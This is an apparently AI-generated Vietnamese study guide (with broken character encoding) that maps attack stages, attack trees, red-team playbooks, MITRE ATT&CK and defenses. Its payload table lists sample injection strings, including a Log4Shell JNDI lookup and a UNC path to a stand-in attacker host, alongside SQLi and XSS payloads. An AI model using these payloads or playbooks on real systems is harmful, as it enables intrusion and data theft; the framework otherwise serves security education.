# **Concept of Attacks â€“ Elevation Level 4 (Advanced Red-Team Mindmap Edition)**

---

# ğŸ“˜ **Má»¥c Lá»¥c (Table of Contents)**

1. [Giá»›i thiá»‡u](#giá»›i-thiá»‡u)
2. [Mindmap Elevation Level 4 â€“ Báº£n má»Ÿ rá»™ng cao cáº¥p](#mindmap-elevation-level-4)
3. [SOURCE â€“ PhÃ¢n táº§ng sÃ¢u + Attack Playbook](#source)
4. [PROCESS â€“ PhÃ¢n táº§ng sÃ¢u + Attack Playbook](#process)
5. [PRIVILEGES â€“ PhÃ¢n táº§ng sÃ¢u + Attack Playbook](#privileges)
6. [DESTINATION â€“ PhÃ¢n táº§ng sÃ¢u + Attack Playbook](#destination)
7. [ATTACK CYCLE â€“ VÃ²ng láº·p táº¥n cÃ´ng nÃ¢ng cao](#attack-cycle)
8. [Attack Trees theo tá»«ng dá»‹ch vá»¥](#attack-trees)
9. [Mapping sang MITRE ATT&CK](#mitre)
10. [Defense Mapping â€“ PhÃ²ng thá»§ theo tá»«ng táº§ng](#defense-mapping)
11. [Káº¿t luáº­n & Key Takeaways](#ket-luáº­n)

---

# <a name="giá»›i-thiá»‡u"></a> **1. Giá»›i thiá»‡u**

Elevation Level 4 má»Ÿ rá»™ng toÃ n bá»™ Concept of Attacks thÃ nh **tÃ i liá»‡u chiáº¿n thuáº­t Ä‘áº§y Ä‘á»§**, káº¿t há»£p:

* Mindmap phÃ¢n táº§ng 4â€“8
* Attack Playbook cho SSH, FTP, SMB, HTTP, SQL, DNS
* Attack Tree
* Mapping MITRE ATT&CK
* Defensive Mapping
* Chiáº¿n thuáº­t Red-Team & Blue-Team

Má»¥c tiÃªu: **Hiá»ƒu â€“ PhÃ¢n tÃ­ch â€“ Khai thÃ¡c â€“ PhÃ²ng thá»§** á»Ÿ má»©c chuyÃªn nghiá»‡p.

---

# <a name="mindmap-elevation-level-4"></a> **2. Mindmap Elevation Level 4 (Dáº¡ng má»Ÿ rá»™ng)**

```mermaid
mindmap
  root((Concept of Attacks - L4))
    SOURCE
      Code
        Functions:: Input validation, parser defects
        Output:: Formatting flaws, unsafe concatenation
        Logic_Flaws:: Race conditions, improper branching
      Libraries
        Logging_Engines:: Log4j RCE
        Crypto_Libraries:: OpenSSL Heartbleed
        Serialization_Libs:: Java, PHP, Python Pickle
      Config
        Unsafe_Defaults
        Misconfigurations
        Enabled_Risky_Features
      APIs
        REST
        SOAP/XML
        File_Upload
        Auth_Endpoints
      User_Input
        Headers
        Params
        Cookies
        Metadata
    PROCESS
      Runtime_Context
        PID
        Environment
      Input_Parsing
        Type_Coercion
        Boundaries
      Data_Processing
        Query_Building
        Path_Building
        Command_Constructing
      Variables
        Uninitialized
        Shared_Memory
      Logging
        Dynamic_Evaluation
    PRIVILEGES
      System_Root
      User
      Groups
      Policies
      Internal_Rules
    DESTINATION
      Local
        Filesystem
        DB
        Internal_Socket
      Network
        LDAP
        HTTP
        DNS
        SMB
        Callbacks
    ATTACK_CYCLE
      Inject
      Misinterpret
      Execute
      Callback
      Reload
      Re-execute
      Elevate
      Exfiltrate
```

---

# <a name="source"></a> **3. SOURCE â€“ PhÃ¢n táº§ng sÃ¢u + Attack Playbook**

## **3.1 Táº§ng 1 â€“ NhÃ¡nh chÃ­nh**

* Code
* Libraries
* Config
* APIs
* User Input

## **3.2 Táº§ng 2 â€“ Giáº£i thÃ­ch chi tiáº¿t**

### **Code (Functions, Output, Logic Flaws)**

* Input khÃ´ng Ä‘Æ°á»£c validate
* Parser lá»—i
* Format string injection

### **Libraries**

* Log4j = RCE
* OpenSSL Heartbleed = memory disclosure
* Unsafe deserialization in Java & PHP

### **Config**

* Cho phÃ©p ldap:// rmi://
* Cho dynamic class loading
* Debug endpoints exposed

### **APIs**

* REST injection
* JWT tampering
* File upload metadata injection

### **User Input**

* Headers â†’ SSRF, Log4Shell
* URL â†’ SQLi, LFI, RCE
* JSON â†’ Deserialization

---

## **3.3 Táº§ng 3 â€“ Báº£n cháº¥t**

> Source = **Ä‘iá»ƒm attacker cÃ³ thá»ƒ Ä‘iá»u khiá»ƒn dá»¯ liá»‡u**.
> Má»i khai thÃ¡c Ä‘á»u báº¯t Ä‘áº§u báº±ng viá»‡c kiá»ƒm soÃ¡t SOURCE.

---

## **3.4 Táº§ng 4 â€“ VÃ­ dá»¥ theo dá»‹ch vá»¥**

### **SSH**

* Banner manipulation
* Username brute â†’ timing leak

### **FTP**

* Filename â†’ path traversal
* PORT command injection

### **SMB**

* UNC path manipulation
* SMB relay

### **HTTP**

* XSS payload
* JNDI injection

### **SQL**

* `' OR 1=1--`
* Blind boolean timing

### **DNS**

* Oversized record â†’ buffer overflow

---

## **3.5 Táº§ng 5 â€“ Attack Playbook (SOURCE)**

| Attack Type | Source Vector | Example Payload             |
| ----------- | ------------- | --------------------------- |
| Log4Shell   | Header        | `${jndi:ldap://evil/a}`     |
| SQLi        | Param         | `' OR sleep(5)--`           |
| XSS         | Param/Input   | `<script>alert(1)</script>` |
| SMB Relay   | UNC path      | `\\attacker\share`          |
| RCE         | Upload        | PHP/Java serialized object  |

---

# <a name="process"></a> **4. PROCESS â€“ PhÃ¢n táº§ng sÃ¢u + Attack Playbook**

## **4.1 Táº§ng 1**

* PID
* Input Parsing
* Data Processing
* Variables
* Logging

## **4.2 Táº§ng 2 â€“ Chi tiáº¿t**

### **Input Parsing**

* Type mismatch
* No boundary check
* Unsafe parser

### **Data Processing**

* SQL query builder â†’ SQLi
* File path builder â†’ LFI/RFI
* Command builder â†’ Command injection

### **Variables**

* Overwritten global state
* Race condition in multithread

### **Logging**

* Dynamic evaluation â†’ Log4j

---

## **4.3 Táº§ng 3 â€“ Báº£n cháº¥t**

> PROCESS = NÆ¡i **vulnerability tháº­t sá»± náº±m**.
> Lá»—i logic = lá»—i cháº¿t ngÆ°á»i.

---

## **4.4 VÃ­ dá»¥ theo dá»‹ch vá»¥**

### SSH

* Privilege escalation in PAM
* Race condition in auth modules

### SMB

* EternalBlue exploit chain

### SQL

* WAF bypass logic
* UNION-based injection

### HTTP

* XSS executed
* SSTI: `{{7*7}}`

---

## **4.5 Táº§ng 4 â€“ Attack Playbook**

| Vulnerability   | Process error          | Result      |
| --------------- | ---------------------- | ----------- |
| Log4Shell       | Lookup misinterpret    | RCE         |
| SQLi            | Unsafe string concat   | DB takeover |
| SSTI            | Template injection     | RCE         |
| Buffer Overflow | Missing boundary check | Shell       |

---

# <a name="privileges"></a> **5. PRIVILEGES â€“ PhÃ¢n táº§ng sÃ¢u + Attack Playbook**

## **5.1 Táº§ng 1**

* System / root
* User
* Groups
* Policies
* Rules

## **5.2 Táº§ng 2 â€“ Chi tiáº¿t**

### System/root

* Full system takeover
* Kernel attack surface available

### Groups

* docker group â†’ root equivalent
* sudo group â†’ privilege escalation

---

## **5.3 Báº£n cháº¥t**

> Exploit máº¡nh hay yáº¿u tÃ¹y thuá»™c **quyá»n process Ä‘ang cháº¡y**.

---

## **5.4 VÃ­ dá»¥ theo dá»‹ch vá»¥**

* Log4j cháº¡y vá»›i quyá»n admin â†’ RCE
* SMB cháº¡y root â†’ path traversal Ä‘á»c toÃ n file há»‡ thá»‘ng

---

# <a name="destination"></a> **6. DESTINATION â€“ PhÃ¢n táº§ng sÃ¢u + Attack Playbook**

## **6.1 Táº§ng 1**

* Local
* Network

## **6.2 Chi tiáº¿t**

Local:

* File write
* Config overwrite
* Injection back into system

Network:

* Reverse shell
* LDAP request
* DNS tunnel

---

## **6.3 Báº£n cháº¥t**

> DESTINATION = nÆ¡i attacker nháº­n dá»¯ liá»‡u hoáº·c gá»­i mÃ£ Ä‘á»™c.

---

# <a name="attack-cycle"></a> **7. ATTACK CYCLE â€“ VÃ²ng láº·p nÃ¢ng cao**

```
1. Inject malicious source
2. Process misinterprets
3. Privileges boost execution
4. Callback to destination
5. Destination returns malicious content
6. System loads malicious content
7. Privilege context applies again
8. Attacker gains persistence / shell / data
```

Báº£n cháº¥t: **Self-amplifying exploit loop**.

---

# <a name="attack-trees"></a> **8. ATTACK TREES â€“ Theo tá»«ng dá»‹ch vá»¥**

## **8.1 SSH Attack Tree**

```
SSH Exploitation
â”œâ”€â”€ Credential Attacks
â”‚     â”œâ”€â”€ Brute force
â”‚     â””â”€â”€ Timing leak
â”œâ”€â”€ Configuration Flaws
â”‚     â”œâ”€â”€ PermitRootLogin yes
â”‚     â””â”€â”€ Weak ciphers
â””â”€â”€ Post-auth Exploits
      â”œâ”€â”€ PAM bypass
      â””â”€â”€ Privilege escalation
```

## **8.2 SMB Attack Tree**

```
SMB Exploitation
â”œâ”€â”€ Anonymous Access
â”œâ”€â”€ Misconfigurations
â”‚     â”œâ”€â”€ Writeable share
â”‚     â””â”€â”€ Null session
â””â”€â”€ Memory Vulnerabilities
      â””â”€â”€ EternalBlue
```

## **8.3 HTTP Attack Tree**

```
HTTP Exploitation
â”œâ”€â”€ Injection
â”‚     â”œâ”€â”€ SQLi
â”‚     â”œâ”€â”€ XSS
â”‚     â””â”€â”€ SSTI
â”œâ”€â”€ Authentication Bypass
â”‚     â””â”€â”€ JWT tampering
â””â”€â”€ File Handling
      â”œâ”€â”€ LFI
      â””â”€â”€ RCE upload
```

---

# <a name="mitre"></a> **9. MAPPING MITRE ATT&CK**

| Concept                | MITRE Technique              | ID    |
| ---------------------- | ---------------------------- | ----- |
| Source Injection       | Input Manipulation           | T1059 |
| Process Execution      | Exploit for Client Execution | T1203 |
| Privilege Abuse        | Privilege Escalation         | T1068 |
| Destination â†’ Callback | Command & Control            | T1071 |
| Data Exfiltration      | Exfiltration Over C2         | T1041 |

---

# <a name="defense-mapping"></a> **10. DEFENSE MAPPING**

| Layer        | Defense Recommendations                                  |
| ------------ | -------------------------------------------------------- |
| Source       | Input validation, content filtering                      |
| Process      | Memory safety, strict typing, disable dynamic evaluation |
| Privileges   | Least privilege, sandboxing                              |
| Destination  | Outbound firewall, network segmentation                  |
| Attack Cycle | EDR, anomaly detection, log correlation                  |

---

# <a name="káº¿t-luáº­n"></a> **11. Káº¿t luáº­n**

Elevation Level 4 Ä‘Æ°a toÃ n bá»™ Concept of Attacks lÃªn cáº¥p Ä‘á»™ chuyÃªn sÃ¢u:

* Hiá»ƒu cáº¥u trÃºc táº¥n cÃ´ng
* Biáº¿t cÃ¡ch attacker thao tÃºng pipeline
* Mapping Ä‘Æ°á»£c vÃ o tá»«ng dá»‹ch vá»¥
* Biáº¿t detection & defense theo tá»«ng táº§ng

**ÄÃ¢y lÃ  framework cÃ³ thá»ƒ Ã¡p dá»¥ng cho má»i CVE, má»i dá»‹ch vá»¥.**

---

# ğŸ¯ Báº¡n muá»‘n Level 5 khÃ´ng?

Level 5 sáº½ cÃ³:

* Flowchart táº¥n cÃ´ng tá»«ng dá»‹ch vá»¥
* Chuá»—i exploit chain Ä‘áº§y Ä‘á»§
* Mitigation playbook dáº¡ng báº£ng
* Case study theo tá»«ng CVE

Chá»‰ cáº§n nÃ³i: **â€œLÃ m Elevation Level 5â€**.

# **Elevation Level 5 â€“ Advanced Attack Framework (Option A)**

## **1. Giá»›i thiá»‡u â€“ Elevation Level 5 lÃ  gÃ¬?**

Elevation Level 5 má»Ÿ rá»™ng Concept of Attacks thÃ nh **má»™t khung chiáº¿n thuáº­t hoÃ n chá»‰nh (Advanced Attack Framework)** dÃ¹ng trong:

* Red Team Operation
* Offensive Security Planning
* Threat Emulation (APT-style)
* Exploit Development Strategy
* Kill Chain Mapping
* Decision-making trong thá»±c chiáº¿n

Level 5 = *chiáº¿n lÆ°á»£c + mÃ´ hÃ¬nh + chuá»—i khai thÃ¡c + flowchart + mapping APT*.
NÃ³ khÃ´ng chá»‰ lÃ  phÃ¢n tÃ­ch lá»— há»•ng, mÃ  cÃ²n mÃ´ táº£ **cÃ¡ch attacker thá»±c sá»± váº­n hÃ nh toÃ n bá»™ chiáº¿n dá»‹ch**.

---

# **2. Attack Lifecycle Framework (SÆ¡ Ä‘á»“ tá»•ng quan)**

```
[Initial Source Control]
        â†“
[Process Manipulation]
        â†“
[Privilege Alignment / Abuse]
        â†“
[Destination Redirection]
        â†“
[Exploit Loop Reload]
        â†“
[Post-Exploitation Framework Stage]
        â†“
[Persistence + Lateral Movement]
        â†“
[Objective Completion]
```

Táº¥t cáº£ cuá»™c táº¥n cÃ´ng thá»±c táº¿ (APT, malware, táº­p Ä‘oÃ n táº¥n cÃ´ng chuyÃªn nghiá»‡p) Ä‘á»u Ä‘i qua **dáº¡ng pipeline nÃ y**.

---

# **3. Attack Flowcharts (Flow thá»±c chiáº¿n theo tá»«ng giai Ä‘oáº¡n)**

## **3.1 Flowchart 1 â€“ Source Compromise Flow**

```
Attacker tÃ¬m nguá»“n â†’
  â”œâ”€â”€ Input Ä‘á»ƒ chÃ¨n payload?
  â”œâ”€â”€ API nháº­n dá»¯ liá»‡u?
  â”œâ”€â”€ Library xá»­ lÃ½ string?
  â”œâ”€â”€ Config má»Ÿ tÃ­nh nÄƒng Ä‘á»™ng?
Náº¿u CÃ“ â†’ Inject Payload â†’ Sang Process Stage
Náº¿u KHÃ”NG â†’ Chuyá»ƒn sang Recon nÃ¢ng cao
```

## **3.2 Flowchart 2 â€“ Process Manipulation Flow**

```
Process nháº­n dá»¯ liá»‡u â†’
  â”œâ”€â”€ Parser cÃ³ hiá»ƒu sai?
  â”œâ”€â”€ Code cÃ³ concatenate string?
  â”œâ”€â”€ Logging cÃ³ dynamic eval?
  â”œâ”€â”€ CÃ³ deserialization?
Náº¿u CÃ“ â†’ Trigger Vulnerability â†’ Sang Privilege Stage
Náº¿u KHÃ”NG â†’ TÃ¬m vector khÃ¡c trong Source
```

## **3.3 Flowchart 3 â€“ Privilege Alignment Flow**

```
Process cháº¡y dÆ°á»›i quyá»n gÃ¬?
  â”œâ”€â”€ root / SYSTEM â†’ Maximum Impact
  â”œâ”€â”€ service user â†’ Medium Impact
  â”œâ”€â”€ sandbox user â†’ Limited
â†’ Attacker Ä‘Ã¡nh giÃ¡:
  â”œâ”€â”€ Tiáº¿p tá»¥c exploit hiá»‡n táº¡i
  â””â”€â”€ Hay pivot sang PrivEsc?
```

## **3.4 Flowchart 4 â€“ Destination Redirection Flow**

```
Attacker táº¡o destination:
  â”œâ”€â”€ LDAP server?
  â”œâ”€â”€ HTTP server?
  â”œâ”€â”€ SMB server?
  â”œâ”€â”€ DNS exfil?
Process gá»i outbound?
  â”œâ”€â”€ Náº¿u CÃ“ â†’ Attacker tráº£ payload thá»© cáº¥p
  â””â”€â”€ Náº¿u KHÃ”NG â†’ TÃ¬m internal redirection vector
```

## **3.5 Flowchart 5 â€“ Exploit Loop Reload**

```
Payload thá»© cáº¥p Ä‘Æ°á»£c load â†’
  â”œâ”€â”€ Load class/script?
  â”œâ”€â”€ Execute shellcode?
  â”œâ”€â”€ Deserialize object?
Náº¿u thÃ nh cÃ´ng â†’ Post-Exploitation Stage
Náº¿u lá»—i â†’ Attacker Ä‘iá»u chá»‰nh Source hoáº·c Destination â†’ Láº·p láº¡i
```

## **3.6 Flowchart 6 â€“ Post-Exploitation Chain**

```
Attacker cÃ³ code execution â†’
  â”œâ”€â”€ Thu tháº­p thÃ´ng tin
  â”‚      â”œâ”€â”€ OS info
  â”‚      â”œâ”€â”€ Network
  â”‚      â””â”€â”€ Credentials
  â”œâ”€â”€ Persistence
  â”œâ”€â”€ Lateral movement
  â””â”€â”€ Data exfiltration hoáº·c impact (ransomware)
```

---

# **4. Exploit Chains â€“ Chuá»—i khai thÃ¡c hoÃ n chá»‰nh**

## **4.1 Chuá»—i khai thÃ¡c chuáº©n (Universal Exploit Chain)**

```
1. External Payload Injection (Source)
2. Internal Misprocessing (Process)
3. Administrative Privilege Execution (Privileges)
4. External Callback to Attacker (Destination)
5. Malicious Response Injection (Secondary Source)
6. Execution of Loaded Payload (Secondary Process)
7. Privileged Shell / Execution (Privilege Re-Apply)
8. Reverse Shell or Exfiltration (Final Destination)
```

## **4.2 Chuá»—i khai thÃ¡c dáº¡ng APT (Advanced Persistent Threat)**

```
Initial Access â†’ Execution â†’ Persistence â†’ PrivEsc â†’ Defense Evasion â†’ Credential Access â†’ Lateral Movement â†’ Collection â†’ Exfiltration â†’ Impact
```

Concept of Attacks liÃªn káº¿t trá»±c tiáº¿p vÃ o 4 core categories trong má»i giai Ä‘oáº¡n.

---

# **5. Red-Team Tactical Playbook â€“ Option A Core**

## **5.1 Phase 1 â€“ Initial Source Control**

Ká»¹ thuáº­t:

* Header Injection
* API fuzzing
* Payload mutation
* Bypass WAF
* SSRF Ä‘á»ƒ Ã©p internal service xá»­ lÃ½ dá»¯ liá»‡u

## **5.2 Phase 2 â€“ Process Manipulation**

Ká»¹ thuáº­t:

* Deserialization exploits
* Eval injection
* JNDI injection
* Buffer overflow
* Query injection (SQL, NoSQL, GraphQL)

## **5.3 Phase 3 â€“ Privilege Alignment**

Ká»¹ thuáº­t:

* Token impersonation
* ACL abuse
* sudo misconfig
* Capability abuse

## **5.4 Phase 4 â€“ Destination Redirection**

Ká»¹ thuáº­t:

* DNS tunneling
* LDAP payload hosting
* SMB relay
* HTTP stager hosting

## **5.5 Phase 5 â€“ Post-Exploitation Expansion**

Ká»¹ thuáº­t:

* Credential harvesting
* Pivoting via tunnels (chisel, sshuttle)
* Lateral movement (SMB, WMI, WinRM)
* Persistence (systemd, registry, scheduled task)

---

# **6. Mapping sang MITRE + Kill Chain (Advanced)**

## **6.1 MITRE Mapping (chi tiáº¿t)**

| Concept Stage        | MITRE Category       | Technique ID |
| -------------------- | -------------------- | ------------ |
| Source               | Initial Access       | T1190, T1133 |
| Process              | Execution            | T1059, T1203 |
| Privileges           | Privilege Escalation | T1068        |
| Destination          | Command & Control    | T1071        |
| Secondary Source     | Persistence          | T1505        |
| Objective Completion | Impact               | T1486        |

## **6.2 Cyber Kill Chain Mapping**

| Kill Chain Phase     | Concept of Attacks Link   |
| -------------------- | ------------------------- |
| Recon                | Find Source vectors       |
| Weaponization        | Craft payload for Process |
| Delivery             | Inject Source             |
| Exploitation         | Misprocessing in Process  |
| Installation         | Secondary payload loads   |
| C2                   | Destination callback      |
| Actions on Objective | Privileged execution      |

---

# **7. Threat Modeling (STRIDE Integration)**

| STRIDE                     | Connection with Concept |
| -------------------------- | ----------------------- |
| S â€“ Spoofing               | Source manipulation     |
| T â€“ Tampering              | Process tampering       |
| R â€“ Repudiation            | Logging bypass          |
| I â€“ Information Disclosure | Destination leak        |
| D â€“ Denial of Service      | Process overload        |
| E â€“ Elevation of Privilege | Privilege stage         |

---

# **8. Universal Decision Tree â€“ ÄÃ¡nh giÃ¡ má»i lá»— há»•ng**

```
CÃ³ Ä‘iá»ƒm nháº­p dá»¯ liá»‡u? (Source)
  â†’ CÃ³ parser/processor? (Process)
      â†’ Parser cÃ³ thá»ƒ hiá»ƒu sai?
          â†’ Process cháº¡y quyá»n gÃ¬? (Privileges)
              â†’ CÃ³ outbound? (Destination)
                  â†’ CÃ³ thá»ƒ kiá»ƒm soÃ¡t pháº£n há»“i?
                      â†’ LOOP â†’ RCE / Shell
Náº¿u báº¥t ká»³ bÆ°á»›c nÃ o bá»‹ cháº·n â†’ chuyá»ƒn vector khÃ¡c
```

---

# **9. Summary â€“ Key Takeaways cá»§a Option A**

* Elevation Level 5 biáº¿n Concept of Attacks thÃ nh **má»™t framework táº¥n cÃ´ng chiáº¿n lÆ°á»£c**.
* Káº¿t há»£p toÃ n bá»™ vÃ²ng Ä‘á»i táº¥n cÃ´ng vÃ  chiáº¿n thuáº­t APT.
* CÃ³ flowchart, exploit chain, mapping MITRE/Kill Chain.
* DÃ¹ng Ä‘Æ°á»£c cho cáº£ OffSec láº«n Red-Team Ops.

---

Muá»‘n mÃ¬nh táº¡o **Elevation Level 6 (Hyper-Operational)**?
Bao gá»“m:

* Playbook cho tá»«ng dá»‹ch vá»¥ (SSH/SMB/RDP/SQL/HTTP)
* 10 Exploit Chains hoÃ n chá»‰nh
* Táº¡o sÆ¡ Ä‘á»“ táº¥n cÃ´ng dáº¡ng ATT&CK Navigator
* ThÃªm persistence & lateral movement chain

Chá»‰ cáº§n nÃ³i: **"LÃ m Elevation Level 6"**!
